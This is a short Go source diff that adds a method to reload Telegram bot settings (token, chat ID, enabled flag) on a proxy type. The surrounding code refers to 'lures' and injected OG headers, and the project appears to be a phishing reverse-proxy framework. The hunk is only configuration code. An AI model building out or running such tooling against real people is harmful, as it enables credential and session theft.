@@ -2234,6 +2234,17 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 	return body
 }
 
+// ReloadTelegramConfig re-reads the Telegram config and applies it to the live bot instance.
+// This is called by the WebAPI when Telegram settings are saved from the dashboard.
+func (p *HttpProxy) ReloadTelegramConfig() {
+	telegramConfig := p.cfg.GetTelegramConfig()
+	if telegramConfig != nil {
+		p.telegram.SetConfig(telegramConfig.BotToken, telegramConfig.ChatID, telegramConfig.Enabled)
+		p.telegram.Start()
+		log.Info("telegram: bot config reloaded from web dashboard")
+	}
+}
+
 func (p *HttpProxy) Start() error {
 	// Configure and start Telegram bot
 	telegramConfig := p.cfg.GetTelegramConfig()
